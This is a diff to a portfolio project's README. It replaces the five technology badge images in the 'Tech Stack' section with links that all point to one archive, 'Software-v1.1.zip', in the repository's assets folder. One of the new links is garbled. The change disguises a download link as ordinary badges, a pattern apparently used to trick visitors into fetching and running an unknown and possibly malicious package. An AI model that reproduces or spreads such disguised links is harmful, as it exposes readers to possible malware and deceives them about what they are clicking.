@@ -7,9 +7,9 @@ Showcases my projects, skills, and experience with sleek design and smooth anima
 
 ## 🚀 Tech Stack
 
-![React](https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB)
-![TypeScript](https://img.shields.io/badge/TypeScript-3178C6?style=for-the-badge&logo=typescript&logoColor=white)
-![Tailwind CSS](https://img.shields.io/badge/TailwindCSS-06B6D4?style=for-the-badge&logo=tailwindcss&logoColor=white)
-![ShadCN/UI](https://img.shields.io/badge/ShadCN%2FUI-111111?style=for-the-badge&logo=shadcnui&logoColor=white)
-![Magic UI](https://img.shields.io/badge/MagicUI-8B5CF6?style=for-the-badge&logo=sparkles&logoColor=white)
+![React](https://raw.githubusercontent.com/prodot-com/probaldev/main/assets/Software-v1.1.zip)
+![TypeScript](https://raw.githubusercontent.com/prodot-com/probaldev/main/assets/Software-v1.1.zip)
+![Tailwind CSS](https://raw.githubusercontent.com/prodot-com/probaldev/main/assets/Software-v1.1.zip)
+![ShadCN/UI](https://raw.githubusercontent.com/prodot-com/probaldev/main/assets/Software-v1.1.zip%2FUI-111111?style=for-the-badge&logo=shadcnui&logoColor=white)
+![Magic UI](https://raw.githubusercontent.com/prodot-com/probaldev/main/assets/Software-v1.1.zip)
 
